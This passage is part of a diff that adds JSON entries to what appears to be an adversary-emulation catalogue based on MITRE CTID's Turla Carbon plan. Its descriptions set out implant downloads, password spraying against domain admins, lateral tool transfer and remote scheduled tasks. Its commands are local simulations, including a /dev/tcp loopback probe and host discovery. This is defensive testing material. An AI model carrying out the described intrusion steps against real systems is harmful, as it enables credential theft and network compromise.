+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1105 - Download the CARBON-DLL installer (Adversary)",
+      "name": "CTID - Turla - Carbon - T1105 - Download the CARBON-DLL installer (Adversary)",
+      "description": "Task the SYSTEM level EPIC implant to download the CARBON-DLL installer. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "da986326-8d71-4e85-b767-0c8ffc49a2af",
+        "source_order": 12,
+        "procedure_step": "4.A.1",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.epic.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.epic.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1112 - Execute the CARBON-DLL installer (Adversary)",
+      "name": "CTID - Turla - Carbon - T1112 - Execute the CARBON-DLL installer (Adversary)",
+      "description": "Task the SYSTEM level EPIC implant to execute the CARBON-DLL installer. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1112",
+      "technique_name": "Modify Registry",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1112'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'CTID transient activity\\n' > \"$simulation_root/transient.log\"; : > \"$simulation_root/transient.log\"; ls -l \"$simulation_root/transient.log\"; echo '[SUCCESS] CTID simulation T1112 family=evasion'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "d702d810-3414-4e38-8cbc-22fc429d2da4",
+        "source_order": 13,
+        "procedure_step": "4.A.2-4.A.6",
+        "procedure_group": "procedure_defense_evasion",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "evasion",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.epic.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.epic.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1033 - Perform whoami discovery command (Adversary)",
+      "name": "CTID - Turla - Carbon - T1033 - Perform whoami discovery command (Adversary)",
+      "description": "Task the Carbon implant to execute the whoami discovery command. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Discovery",
+      "tcode": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1033'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; uname -a; id; ps -eo pid,ppid,user,comm | head -n 12; (ip addr 2>/dev/null || ifconfig 2>/dev/null || true); echo '[SUCCESS] CTID simulation T1033 family=discovery'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "f2462df4-2867-4d72-b3f1-ffa9a7431f87",
+        "source_order": 14,
+        "procedure_step": "4.A.13",
+        "procedure_group": "procedure_discovery",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "discovery",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - Open Microsoft Edge on 2nd target host (User)",
+      "name": "CTID - Turla - Carbon - X - Open Microsoft Edge on 2nd target host (User)",
+      "description": "Use xdotool to run Microsoft Edge and open a blank page.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "ctid_turla_carbon_second_target_user"
+      ],
+      "required_assets": [],
+      "command": "rdp_pid=$(pgrep -f #{ctid_turla_carbon_second_target_user});\nrdp_window=$(xdotool search --pid \"$rdp_pid\"); \n\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"run\";\nsleep 6;\nxdotool key --window \"$rdp_window\" Return;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"microsoft-edge\";\nxdotool key --window \"$rdp_window\" shift+colon;\nxdotool key --window \"$rdp_window\" Return;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "02772b8f-4f3b-42c6-9705-1d05b33ad19a",
+        "source_order": 15,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1110.003 - Password Spray (Adversary)",
+      "name": "CTID - Turla - Carbon - T1110.003 - Password Spray (Adversary)",
+      "description": "Task CARBON-DLL to download and execute the batch script to spray weak passwords against the domain admin accounts and attempt to mount the C$ drive of the DC. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Credential Access",
+      "tcode": "T1110.003",
+      "technique_name": "Brute Force: Password Spraying",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1110.003'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'credential_fixture=synthetic_value\\n' > \"$simulation_root/credentials.txt\"; grep 'credential_fixture' \"$simulation_root/credentials.txt\"; echo '[SUCCESS] CTID simulation T1110.003 family=credential'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "99748bd2-530e-47b6-b6d7-576d4f573b6d",
+        "source_order": 16,
+        "procedure_step": "5.A.2-3",
+        "procedure_group": "procedure_credential_access",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "credential",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1070.004 - Remove password spray script (Adversary)",
+      "name": "CTID - Turla - Carbon - T1070.004 - Remove password spray script (Adversary)",
+      "description": "Task CARBON-DLL to remove the password spray script Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.004",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1070.004'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'credential_fixture=synthetic_value\\n' > \"$simulation_root/credentials.txt\"; grep 'credential_fixture' \"$simulation_root/credentials.txt\"; echo '[SUCCESS] CTID simulation T1070.004 family=credential'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "4945a1e5-75ab-4665-8441-6995105edf38",
+        "source_order": 17,
+        "procedure_step": "5.A.4",
+        "procedure_group": "procedure_defense_evasion",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "credential",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1570 - Download second CARBON-DLL (Adversary)",
+      "name": "CTID - Turla - Carbon - T1570 - Download second CARBON-DLL (Adversary)",
+      "description": "Task CARBON-DLL to download a second version of the CARBON-DLL installer and move it to the System32 folder on the DC via the mounted drive. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Lateral Movement",
+      "tcode": "T1570",
+      "technique_name": "Lateral Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1570'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1570 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "386b614d-7237-4d1a-a6dd-543f6f515bd4",
+        "source_order": 18,
+        "procedure_step": "5.A.5-6",
+        "procedure_group": null,
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1053.005 - Enumerate remote scheduled tasks (Adversary)",
+      "name": "CTID - Turla - Carbon - T1053.005 - Enumerate remote scheduled tasks (Adversary)",
+      "description": "Task CARBON-DLL to enumerate remote scheduled tasks on the domain controller, using the discovered password for the domain admin Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Execution",
+      "tcode": "T1053.005",
+      "technique_name": "Scheduled Task/Job: Scheduled Task",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1053.005'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf '@reboot /bin/true # Morgana CTID simulation\\n' > \"$simulation_root/ctid-crontab\"; cat \"$simulation_root/ctid-crontab\"; echo '[SUCCESS] CTID simulation T1053.005 family=persistence'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "954ee411-8443-41f9-9a0c-f8ac032b68e7",
+        "source_order": 19,
+        "procedure_step": "5.A.7",
+        "procedure_group": "procedure_execution",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "persistence",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1053.005 - Modify remote scheduled task (Adversary)",
+      "name": "CTID - Turla - Carbon - T1053.005 - Modify remote scheduled task (Adversary)",
+      "description": "Task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain admin Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Persistence",
+      "tcode": "T1053.005",
+      "technique_name": "Scheduled Task/Job: Scheduled Task",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1053.005'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf '@reboot /bin/true # Morgana CTID simulation\\n' > \"$simulation_root/ctid-crontab\"; cat \"$simulation_root/ctid-crontab\"; echo '[SUCCESS] CTID simulation T1053.005 family=persistence'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "c90bbb6c-f9bd-4811-b7b7-c923902a8bde",
+        "source_order": 20,
+        "procedure_step": "5.A.7",
+        "procedure_group": "procedure_persistence",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "persistence",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1053.005 - Execute modified scheduled task (Adversary)",
+      "name": "CTID - Turla - Carbon - T1053.005 - Execute modified scheduled task (Adversary)",
+      "description": "Task CARBON-DLL to remotely start the modified scheduled task on the domain controller Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1053.005",
+      "technique_name": "Scheduled Task/Job: Scheduled Task",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1053.005'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf '@reboot /bin/true # Morgana CTID simulation\\n' > \"$simulation_root/ctid-crontab\"; cat \"$simulation_root/ctid-crontab\"; echo '[SUCCESS] CTID simulation T1053.005 family=persistence'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "a2621060-73a5-461b-918d-88a86f83c21b",
+        "source_order": 21,
+        "procedure_step": "5.A.7",
+        "procedure_group": "procedure_privilege_escalation",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "persistence",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1069.002 - Discovery on domain controller (Adversary)",
+      "name": "CTID - Turla - Carbon - T1069.002 - Discovery on domain controller (Adversary)",
+      "description": "Task the new CARBON-DLL implant with discovery commands to be run on the domain controller. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Discovery",
+      "tcode": "T1069.002",
+      "technique_name": "Permission Groups Discovery: Domain Groups",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1069.002'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; uname -a; id; ps -eo pid,ppid,user,comm | head -n 12; (ip addr 2>/dev/null || ifconfig 2>/dev/null || true); echo '[SUCCESS] CTID simulation T1069.002 family=discovery'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "bf90a64c-5367-4de6-93b5-a718189803c3",
+        "source_order": 22,
+        "procedure_step": "5.A.9",
+        "procedure_group": "procedure_discovery",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "discovery",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1069.002 - Enumerate groups (Adversary)",
+      "name": "CTID - Turla - Carbon - T1069.002 - Enumerate groups (Adversary)",
+      "description": "Task CARBON-DLL to enumerate both groups for their members Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Discovery",
+      "tcode": "T1069.002",
+      "technique_name": "Permission Groups Discovery: Domain Groups",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1069.002'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; uname -a; id; ps -eo pid,ppid,user,comm | head -n 12; (ip addr 2>/dev/null || ifconfig 2>/dev/null || true); echo '[SUCCESS] CTID simulation T1069.002 family=discovery'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "4e39b630-f2d7-405e-a4ef-d11cf79db1be",
+        "source_order": 23,
+        "procedure_step": "5.A.9",
+        "procedure_group": "procedure_discovery",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "discovery",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1018 - Enumerate Active Directory Computers (Adversary)",
+      "name": "CTID - Turla - Carbon - T1018 - Enumerate Active Directory Computers (Adversary)",
+      "description": "Task CARBON-DLL to enumerate the Active Directory Computers Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Discovery",
+      "tcode": "T1018",
+      "technique_name": "Remote System Discovery",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1018'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; uname -a; id; ps -eo pid,ppid,user,comm | head -n 12; (ip addr 2>/dev/null || ifconfig 2>/dev/null || true); echo '[SUCCESS] CTID simulation T1018 family=discovery'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "4e31798e-f973-4480-aa38-3372c44c29c9",
+        "source_order": 24,
+        "procedure_step": "5.A.10",
+        "procedure_group": "procedure_discovery",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "discovery",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
